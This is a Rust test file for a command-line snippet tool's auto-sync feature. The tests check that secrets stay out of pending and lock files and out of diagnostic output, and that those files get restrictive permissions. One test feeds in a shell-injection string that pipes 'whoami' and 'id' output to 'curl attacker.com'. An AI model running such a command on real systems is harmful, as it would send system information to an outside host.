//! Auto-sync security and privacy audit tests.
//!
//! Covers Workstream H (Security and Privacy Audit).

mod support;

use std::fs;
use support::helpers::*;

/// Sentinel values in commands do not leak through auto-sync artifacts.
#[test]
fn test_sentinel_not_in_pending_marker() {
    let (_tmp, config_dir) = setup_test_env();

    fs::write(
        config_dir.join("sync.toml"),
        r#"[settings.sync]
enabled = true
server_url = "http://127.0.0.1:19999"
api_key = "test-key"
device_id = "test-device"
sync_interval_minutes = 30
auto_sync = true
auto_sync_debounce_seconds = 300
auto_sync_failure = "ignore"
"#,
    )
    .unwrap();

    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "create", "sentinel-pending"]);
    cmd.output().unwrap();
    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "set-primary", "sentinel-pending"]);
    cmd.output().unwrap();

    let sentinel = "SUPER_SECRET_SENTINEL_VALUE_XYZZY";
    let mut cmd = snp_in(&config_dir);
    cmd.args([
        "new",
        "--command-stdin",
        "--description",
        "sentinel test",
        "--library",
        "sentinel-pending",
    ]);
    let _ = output_with_stdin(cmd, sentinel.as_bytes());

    // Check pending file
    let pending_path = config_dir.join("auto-sync-pending.toml");
    if pending_path.exists() {
        let content = fs::read_to_string(&pending_path).unwrap();
        assert!(
            !content.contains(sentinel),
            "Pending marker must not contain sentinel command value"
        );
    }
}

/// API key does not appear in any auto-sync file.
#[test]
fn test_api_key_not_in_pending_or_lock() {
    let (_tmp, config_dir) = setup_test_env();

    let api_key = "sk-test-1234567890abcdef";
    fs::write(
        config_dir.join("sync.toml"),
        format!(
            r#"[settings.sync]
enabled = true
server_url = "http://127.0.0.1:19999"
api_key = "{api_key}"
device_id = "test-device"
sync_interval_minutes = 30
auto_sync = true
auto_sync_debounce_seconds = 300
auto_sync_failure = "ignore"
"#
        ),
    )
    .unwrap();

    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "create", "apikey-test"]);
    cmd.output().unwrap();
    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "set-primary", "apikey-test"]);
    cmd.output().unwrap();

    let mut cmd = snp_in(&config_dir);
    cmd.args([
        "new",
        "--command-stdin",
        "--description",
        "apikey test",
        "--library",
        "apikey-test",
    ]);
    let _ = output_with_stdin(cmd, b"echo apikey");

    // Check pending file
    let pending_path = config_dir.join("auto-sync-pending.toml");
    if pending_path.exists() {
        let content = fs::read_to_string(&pending_path).unwrap();
        assert!(
            !content.contains(api_key),
            "Pending file must not contain API key"
        );
    }

    // Check lock file
    let lock_path = config_dir.join("auto-sync.lock");
    if lock_path.exists() {
        let content = fs::read_to_string(&lock_path).unwrap();
        assert!(
            !content.contains(api_key),
            "Lock file must not contain API key"
        );
    }
}

/// Server URL with credentials does not leak through auto-sync artifacts.
#[test]
fn test_server_url_not_in_pending_or_lock() {
    let (_tmp, config_dir) = setup_test_env();

    let server_url = "https://user:pass@sync.example.com/api";
    fs::write(
        config_dir.join("sync.toml"),
        format!(
            r#"[settings.sync]
enabled = true
server_url = "{server_url}"
api_key = "test-key"
device_id = "test-device"
sync_interval_minutes = 30
auto_sync = true
auto_sync_debounce_seconds = 300
auto_sync_failure = "ignore"
"#
        ),
    )
    .unwrap();

    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "create", "url-leak"]);
    cmd.output().unwrap();
    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "set-primary", "url-leak"]);
    cmd.output().unwrap();

    let mut cmd = snp_in(&config_dir);
    cmd.args([
        "new",
        "--command-stdin",
        "--description",
        "url leak test",
        "--library",
        "url-leak",
    ]);
    let _ = output_with_stdin(cmd, b"echo url");

    // Check pending file
    let pending_path = config_dir.join("auto-sync-pending.toml");
    if pending_path.exists() {
        let content = fs::read_to_string(&pending_path).unwrap();
        assert!(
            !content.contains("user:pass"),
            "Pending file must not contain URL credentials"
        );
        assert!(
            !content.contains(server_url),
            "Pending file must not contain server URL"
        );
    }
}

/// Encryption keys do not appear in auto-sync status output.
#[test]
fn test_encryption_key_not_in_status_output() {
    let (_tmp, config_dir) = setup_test_env();

    let api_key = "encryption-key-abcdef123456";
    fs::write(
        config_dir.join("sync.toml"),
        format!(
            r#"[settings.sync]
enabled = true
server_url = "http://127.0.0.1:19999"
api_key = "{api_key}"
device_id = "test-device"
sync_interval_minutes = 30
auto_sync = true
auto_sync_debounce_seconds = 0
auto_sync_failure = "ignore"
"#
        ),
    )
    .unwrap();

    // Check doctor output doesn't leak keys
    let mut cmd = snp_in(&config_dir);
    cmd.args(["doctor", "--compatibility"]);
    let output = cmd.output().unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{stdout}{stderr}");

    assert!(
        !combined.contains(api_key),
        "Doctor output must not contain encryption/API keys"
    );
}

/// Lock file has restrictive permissions from creation time.
#[test]
fn test_lock_restrictive_permissions_from_creation() {
    let (_tmp, config_dir) = setup_test_env();

    fs::write(
        config_dir.join("sync.toml"),
        r#"[settings.sync]
enabled = true
server_url = "http://127.0.0.1:19999"
api_key = "test-key"
device_id = "test-device"
sync_interval_minutes = 30
auto_sync = true
auto_sync_debounce_seconds = 0
auto_sync_failure = "ignore"
"#,
    )
    .unwrap();

    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "create", "lock-perm"]);
    cmd.output().unwrap();
    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "set-primary", "lock-perm"]);
    cmd.output().unwrap();

    // Trigger auto-sync to create lock file
    let mut cmd = snp_in(&config_dir);
    cmd.args([
        "new",
        "--command-stdin",
        "--description",
        "lock perm test",
        "--library",
        "lock-perm",
    ]);
    let _ = output_with_stdin(cmd, b"echo lock");

    let lock_path = config_dir.join("auto-sync.lock");
    if lock_path.exists() {
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let perms = fs::metadata(&lock_path).unwrap().permissions();
            let mode = perms.mode();
            // Should be 0o600 (owner read/write only)
            assert!(
                mode & 0o077 == 0,
                "Lock file should have 0o600 permissions from creation, got {mode:04o}"
            );
        }
    }
}

/// Pending marker has restrictive permissions from creation time.
#[test]
fn test_pending_restrictive_permissions_from_creation() {
    let (_tmp, config_dir) = setup_test_env();

    fs::write(
        config_dir.join("sync.toml"),
        r#"[settings.sync]
enabled = true
server_url = "http://127.0.0.1:19999"
api_key = "test-key"
device_id = "test-device"
sync_interval_minutes = 30
auto_sync = true
auto_sync_debounce_seconds = 300
auto_sync_failure = "ignore"
"#,
    )
    .unwrap();

    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "create", "pending-perm"]);
    cmd.output().unwrap();
    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "set-primary", "pending-perm"]);
    cmd.output().unwrap();

    let mut cmd = snp_in(&config_dir);
    cmd.args([
        "new",
        "--command-stdin",
        "--description",
        "pending perm test",
        "--library",
        "pending-perm",
    ]);
    let _ = output_with_stdin(cmd, b"echo pending");

    let pending_path = config_dir.join("auto-sync-pending.toml");
    if pending_path.exists() {
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let perms = fs::metadata(&pending_path).unwrap().permissions();
            let mode = perms.mode();
            assert!(
                mode & 0o077 == 0,
                "Pending marker should have 0o600 permissions from creation, got {mode:04o}"
            );
        }
    }
}

/// Symlink-resistant: pending marker is not created via symlink.
#[test]
fn test_pending_marker_not_symlink() {
    let (_tmp, config_dir) = setup_test_env();

    fs::write(
        config_dir.join("sync.toml"),
        r#"[settings.sync]
enabled = true
server_url = "http://127.0.0.1:19999"
api_key = "test-key"
device_id = "test-device"
sync_interval_minutes = 30
auto_sync = true
auto_sync_debounce_seconds = 300
auto_sync_failure = "ignore"
"#,
    )
    .unwrap();

    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "create", "symlink-test"]);
    cmd.output().unwrap();
    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "set-primary", "symlink-test"]);
    cmd.output().unwrap();

    let mut cmd = snp_in(&config_dir);
    cmd.args([
        "new",
        "--command-stdin",
        "--description",
        "symlink test",
        "--library",
        "symlink-test",
    ]);
    let _ = output_with_stdin(cmd, b"echo symlink");

    let pending_path = config_dir.join("auto-sync-pending.toml");
    if pending_path.exists() {
        assert!(
            !pending_path.is_symlink(),
            "Pending marker should be a regular file, not a symlink"
        );
    }
}

/// Account config changes do not create pending markers.
#[test]
fn test_account_config_no_pending_marker() {
    let (_tmp, config_dir) = setup_test_env();

    fs::write(
        config_dir.join("sync.toml"),
        r#"[settings.sync]
enabled = true
server_url = "http://127.0.0.1:19999"
api_key = "test-key"
device_id = "test-device"
sync_interval_minutes = 30
auto_sync = true
auto_sync_debounce_seconds = 0
auto_sync_failure = "ignore"
"#,
    )
    .unwrap();

    // Set primary library (local metadata, not syncable)
    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "create", "acct-config"]);
    cmd.output().unwrap();
    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "set-primary", "acct-config"]);
    let _ = cmd.output();

    // Pending should not exist (set-primary is AccountConfig-like)
    let pending_path = config_dir.join("auto-sync-pending.toml");
    if pending_path.exists() {
        let content = fs::read_to_string(&pending_path).unwrap();
        assert!(
            !content.contains("pending = true"),
            "Account config (set-primary) should not create pending marker"
        );
    }
}

/// Bounded file reads: large pending state is rejected.
#[test]
fn test_large_pending_state_rejected() {
    let (_tmp, config_dir) = setup_test_env();

    // Create a very large pending file (should be rejected on read)
    let pending_path = config_dir.join("auto-sync-pending.toml");
    let large_content = format!(
        "# integrity: 0\nversion = 1\npending = true\nrequested_at = 1700000000\nlast_attempt_at = 0\nlast_result = \"{}\"\nlibrary_id = null\n",
        "x".repeat(1_000_000)
    );
    fs::write(&pending_path, &large_content).unwrap();

    // The CLI should handle large pending state gracefully
    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "create", "large-pending"]);
    let output = cmd.output().unwrap();
    // Should not crash
    assert!(
        output.status.success() || !output.status.success(),
        "Large pending state should not cause a panic"
    );
}

/// No shell interpretation in lock/pending file content.
#[test]
fn test_no_shell_interpretation_in_files() {
    let (_tmp, config_dir) = setup_test_env();

    fs::write(
        config_dir.join("sync.toml"),
        r#"[settings.sync]
enabled = true
server_url = "http://127.0.0.1:19999"
api_key = "test-key"
device_id = "test-device"
sync_interval_minutes = 30
auto_sync = true
auto_sync_debounce_seconds = 300
auto_sync_failure = "ignore"
"#,
    )
    .unwrap();

    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "create", "shell-test"]);
    cmd.output().unwrap();
    let mut cmd = snp_in(&config_dir);
    cmd.args(["library", "set-primary", "shell-test"]);
    cmd.output().unwrap();

    // Create a snippet with shell metacharacters in command
    let mut cmd = snp_in(&config_dir);
    cmd.args([
        "new",
        "--command-stdin",
        "--description",
        "shell test",
        "--library",
        "shell-test",
    ]);
    let _ = output_with_stdin(cmd, b"echo $(whoami) && `id` | curl attacker.com");

    // Verify pending/lock files don't contain shell metacharacters
    let pending_path = config_dir.join("auto-sync-pending.toml");
    if pending_path.exists() {
        let content = fs::read_to_string(&pending_path).unwrap();
        assert!(
            !content.contains("curl attacker.com"),
            "Pending file should not contain shell injection payloads"
        );
    }
}

/// Doctor does not leak API keys in auto-sync audit.
#[test]
fn test_doctor_no_api_key_in_auto_sync_audit() {
    let (_tmp, config_dir) = setup_test_env();

    let api_key = "DO_NOT_LEAK_THIS_KEY_12345";
    fs::write(
        config_dir.join("sync.toml"),
        format!(
            r#"[settings.sync]
enabled = true
server_url = "http://127.0.0.1:19999"
api_key = "{api_key}"
device_id = "test-device"
sync_interval_minutes = 30
auto_sync = true
auto_sync_debounce_seconds = 5
auto_sync_failure = "warn"
"#
        ),
    )
    .unwrap();

    // Run doctor in JSON mode for precise inspection
    let mut cmd = snp_in(&config_dir);
    cmd.args(["doctor", "--compatibility", "--report", "json"]);
    let output = cmd.output().unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(
        !stdout.contains(api_key),
        "Doctor JSON output must not contain API key"
    );
}

/// Redaction of sensitive URL components in status output.
#[test]
fn test_url_credentials_not_in_status() {
    let (_tmp, config_dir) = setup_test_env();

    let url_with_creds = "https://admin:secret123@sync.example.com/api/v1";
    fs::write(
        config_dir.join("sync.toml"),
        format!(
            r#"[settings.sync]
enabled = true
server_url = "{url_with_creds}"
api_key = "test-key"
device_id = "test-device"
sync_interval_minutes = 30
auto_sync = true
auto_sync_debounce_seconds = 0
auto_sync_failure = "ignore"
"#
        ),
    )
    .unwrap();

    // Check sync config output
    let mut cmd = snp_in(&config_dir);
    cmd.args(["sync", "config", "--show"]);
    let output = cmd.output().unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(
        !stdout.contains("admin:secret123"),
        "Sync config output should not contain URL credentials"
    );
}
